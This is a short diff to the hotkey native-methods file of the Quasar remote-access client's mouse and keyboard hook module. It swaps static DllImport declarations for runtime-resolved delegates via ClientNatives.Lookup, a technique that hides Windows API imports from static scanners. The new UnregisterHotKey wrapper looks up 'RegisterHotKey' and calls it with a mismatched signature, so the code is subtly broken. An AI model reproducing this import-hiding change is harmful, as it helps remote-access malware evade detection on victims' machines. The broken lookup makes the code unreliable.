@@ -1,10 +1,12 @@
-﻿using System;
+﻿using Quasar.Client.Utilities;
+using System;
 using System.Runtime.InteropServices;
 
 namespace Quasar.Client.MouseKeyHook.WinApi
 {
     internal static class HotkeysNativeMethods
     {
+        public delegate int RegisterHotKeyProc(IntPtr hwnd, int id, int fsModifiers, int vk);
         /// <summary>
         ///     Defines a system-wide hot key.
         /// </summary>
@@ -28,9 +30,10 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         ///     If the function succeeds, the return value is nonzero.
         ///     If the function fails, the return value is zero. To get extended error information, call GetLastError.
         /// </returns>
-        [DllImport("user32.dll")]
-        public static extern int RegisterHotKey(IntPtr hwnd, int id, int fsModifiers, int vk);
+        //[DllImport("user32.dll")]
+        public static int RegisterHotKey(IntPtr hwnd, int id, int fsModifiers, int vk) => ClientNatives.Lookup<RegisterHotKeyProc>("user32.dll", "RegisterHotKey")(hwnd, id, fsModifiers, vk);
 
+        public delegate bool UnregisterHotKeyProc(IntPtr hwnd, int id);
         /// <summary>
         ///     Frees a hot key previously registered by the calling thread.
         /// </summary>
@@ -45,7 +48,8 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         ///     If the function succeeds, the return value is nonzero.
         ///     If the function fails, the return value is zero. To get extended error information, call GetLastError.
         /// </returns>
-        [DllImport("user32.dll")]
-        public static extern bool UnregisterHotKey(IntPtr hwnd, int id);
+        //[DllImport("user32.dll")]
+        public static bool UnregisterHotKey(IntPtr hwnd, int id) => ClientNatives.Lookup<UnregisterHotKeyProc>("user32.dll", "RegisterHotKey")(hwnd, id);
+
     }
 }
